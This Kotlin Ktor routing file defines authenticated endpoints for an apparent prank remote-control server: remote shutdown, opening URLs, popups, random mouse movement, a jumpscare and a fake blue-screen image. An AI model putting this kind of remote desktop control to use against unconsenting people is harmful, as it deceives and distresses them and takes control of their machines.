package webserver.cm.it.plugins

import io.ktor.http.*
import io.ktor.server.application.*
import io.ktor.server.auth.*
import io.ktor.server.request.*
import io.ktor.server.response.*
import io.ktor.server.routing.*
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import webserver.cm.it.PRANK_VERSION
import webserver.cm.it.prank.*
import webserver.cm.it.request.DialogModel
import webserver.cm.it.request.NotificationModel
import webserver.cm.it.util.frameWithImage

fun Application.configureRouting() {
    routing {
        authenticate("myauth1") {
            get("/version") {
                call.respond(PRANK_VERSION)
            }
            get("/ping") {
                call.respond(HttpStatusCode.OK)
            }
            post("/shutdown") {
                shutdownMe()
            }
            post("/browse") {
                browse(call.receiveText())
                call.respond(HttpStatusCode.OK)
            }
            post("/popup") {
                val model = call.receive<DialogModel>()
                launch { createPopup(model) }
                call.respondText("OK")
            }
            get("/move_mouse") {
                launch { randomMouseMovement(5) }
                call.respond(HttpStatusCode.OK)
            }
            get("/jumpscare") {
                launch {
                    jumpscareFrame()
                }
                call.respond(HttpStatusCode.OK)
            }
            get("/blue_screen") {
                launch {
                    with(frameWithImage("/image/blue_screen.png")) {
                        delay(5000)
                        dispose()
                    }
                }
                call.respond(HttpStatusCode.OK)
            }
            post("/notification") {
                val model = call.receive<NotificationModel>()
                launch { notification(model) }
            }
        }
    }
}